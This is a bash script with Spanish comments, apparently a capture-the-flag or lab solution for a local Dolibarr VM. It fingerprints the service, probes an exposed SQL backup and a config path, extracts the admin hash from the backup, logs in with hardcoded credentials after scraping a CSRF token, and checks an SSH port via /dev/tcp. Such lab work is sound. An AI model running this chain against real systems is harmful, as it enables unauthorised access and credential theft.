#!/bin/bash
# Reconocimiento y validacion de la cadena de ataque (via relay TCP local).
# Requiere: solucion/relay_tcp.py corriendo en Windows y la VM con IP.
set -uo pipefail
B="http://127.0.0.1:8080"

echo "===== 1) Huella del servicio ====="
curl -s -m 10 -I "$B/" | grep -Ei '^(HTTP|Server|Content-Type)'

echo
echo "===== 2) Web publica y backup expuesto ====="
for p in "/" "/old/index.html" "/old/backup_2019.sql" "/erp/" "/erp/conf/conf.php"; do
  printf "%-28s -> %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$B$p")"
done

echo
echo "===== 3) Hash del administrador en el backup publico ====="
curl -s -m 10 "$B/old/backup_2019.sql" | grep -i "INSERT INTO"

echo
echo "===== 4) Login en Dolibarr ====="
J=/tmp/cj_fresia.txt; rm -f $J
TOK=$(curl -s -c $J -m 15 "$B/erp/index.php" | grep -o 'anti-csrf-newtoken" content="[a-f0-9]*"' | head -1 | sed 's/.*content="//;s/"//')
curl -s -b $J -c $J -m 20 -o /dev/null -w "login -> HTTP %{http_code} %{redirect_url}\n" \
  -d "token=$TOK" -d "actionlogin=login" -d "loginfunction=loginfunction" \
  -d "username=lautaro" -d "password=caupolican" "$B/erp/index.php"

echo
echo "===== 5) SSH ====="
timeout 6 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/2222" && echo "2222/tcp abierto"
